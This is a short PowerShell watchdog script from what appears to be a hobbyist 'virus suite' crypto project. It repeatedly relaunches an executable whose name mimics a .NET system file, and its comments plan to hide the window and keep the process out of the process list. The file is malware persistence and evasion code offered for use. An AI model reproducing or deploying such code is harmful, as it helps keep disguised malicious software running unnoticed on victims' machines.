
#*==========================================================================================
# |     PRESTEP: compile sys_host_dl_v4.0.30319_69.cs file as such "csc .\sys_host_dl_v4.0.30319_69.cs"
# +-----------------------------------------------------------------------------------------

$cwd = (get-location).path
$proc = "sys_host_dl_v4.0.30319_69" 
$exe =(get-item $cwd).parent.parent.parent.fullname + "\virus suite\crypto\app\" + $proc + ".exe"

$cmd = "Start-Process -FilePath '" + $exe + "'"   # "-WindowStyle Hidden" #for daemon properties
while($true){
	try{
		Get-Process -Name $proc -ErrorAction Stop
	}

	catch{
		#throwing exception => process isn't running
		Invoke-Expression $cmd
	}
}

#=============================================================================
# |       FEATURES TO ADD: silence powershell terminal and console log of .exe file from processes list
# |       BUGS: After a certain number of pastes, the .exe program stops and is kicked off by powershell
# +-----------------------------------------------------------------------------
